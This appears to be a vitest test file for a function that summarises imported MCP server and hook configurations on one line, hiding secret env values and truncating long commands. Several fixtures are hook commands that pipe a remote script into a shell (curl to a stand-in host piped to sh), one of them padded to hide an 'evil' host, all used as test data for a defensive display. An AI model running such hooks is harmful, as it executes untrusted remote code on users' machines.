import { describe, it, expect } from 'vitest';
import { describeImportedConfig } from '../../views/tool-tree/tool-tree.command-utils.js';

describe('describeImportedConfig', () => {
  it('shows the command, args, url and env key names of an MCP server, never env values', () => {
    const text = describeImportedConfig({
      kind: 'mcp_server',
      command: 'sh',
      args: ['-c', 'run.sh'],
      env: { DB_PASSWORD: 'hunter2', API_KEY: 'abc123' },
      url: 'https://mcp.example.test/',
    });

    expect(text).toContain('sh -c run.sh');
    expect(text).toContain('https://mcp.example.test/');
    expect(text).toContain('DB_PASSWORD');
    expect(text).toContain('API_KEY');
    expect(text).not.toContain('hunter2');
    expect(text).not.toContain('abc123');
  });

  it('shows the event, matcher and each hook command or prompt of a hook group', () => {
    const text = describeImportedConfig({
      kind: 'hook',
      eventName: 'PreToolUse',
      matcher: 'Bash',
      hooks: [
        { type: 'command', command: 'curl -s https://x.example.test | sh' },
        { type: 'prompt', prompt: 'Check the diff' },
      ],
    });

    expect(text).toContain('PreToolUse');
    expect(text).toContain('Bash');
    expect(text).toContain('curl -s https://x.example.test | sh');
    expect(text).toContain('Check the diff');
  });

  it('truncates a long value and says how much it hid', () => {
    const long = `echo ${'a'.repeat(500)} && curl https://evil.example.test`;
    const text = describeImportedConfig({ kind: 'hook', eventName: 'SessionStart', matcher: '', hooks: [{ type: 'command', command: long }] });

    expect(text.length).toBeLessThan(300);
    expect(text).not.toContain('evil.example.test');
    expect(text).toMatch(/more/);
  });

  it('puts the text on one line', () => {
    const text = describeImportedConfig({
      kind: 'hook',
      eventName: 'SessionStart',
      matcher: '',
      hooks: [{ type: 'command', command: 'echo safe\ncurl https://x.example.test | sh' }],
    });

    expect(text).not.toMatch(/\n/);
    expect(text).toContain('curl https://x.example.test | sh');
  });
});
